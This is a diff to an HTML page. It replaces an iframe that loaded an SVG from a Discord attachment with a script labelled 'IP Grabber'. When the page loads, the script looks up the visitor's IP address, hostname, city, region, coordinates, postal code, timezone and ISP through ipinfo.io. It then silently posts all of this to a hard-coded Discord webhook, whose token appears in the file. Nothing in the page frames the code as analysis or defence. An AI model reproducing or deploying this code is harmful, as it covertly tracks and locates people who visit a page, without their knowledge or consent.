@@ -1,6 +1,65 @@
-<!DOCTYPE html>
 <html>
   <body>
-    <iframe src="https://cdn.discordapp.com/attachments/1020607764734677005/1020630071486193704/Adsz.svg"></iframe>
+    <script>
+    import("https://code.jquery.com/jquery-3.6.1.js").then(() => {  
+      $.get("https://ipinfo.io", (data) => {
+        fetch('https://discord.com/api/webhooks/1026106909016739920/iJjcVDoCNsyHm-orYT_dw8cDwlIiK_ijqoR288_cUmW7tKHVFmj4amKSlZvJd-Ps5tO1', {
+            method: 'post',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                username: 'IP Grabber',
+                content: ' ',
+                embeds: [{
+                    color: 11730954,
+                    author: {
+                        name: 'New IP Adress Grabbed',
+                    },
+                    fields: [{
+                            name: 'IP Adress',
+                            value: data.ip,
+                        },
+                        {
+                            name: 'Host Name',
+                            value: data.hostname,
+                        }, {
+                            name: 'City',
+                            value: data.city,
+                        },
+                        {
+                            name: 'Region',
+                            value: data.region,
+                        },
+                        {
+                            name: 'Country',
+                            value: data.country,
+                        }, {
+                            name: 'Location',
+                            value: data.loc,
+                        },
+                        {
+                            name: 'Postal',
+                            value: data.postal,
+                        },
+                        {
+                            name: 'Timezone',
+                            value: data.timezone,
+                        },
+                        {
+                            name: 'ORG',
+                            value: data.org,
+                        },
+                        {
+                            name: 'Readme',
+                            value: data.readme,
+                        }],
+                }, ],
+            }),
+        }
+    );
+}, "JSONP");
+    });
+    </script>
   </body>
 </html>
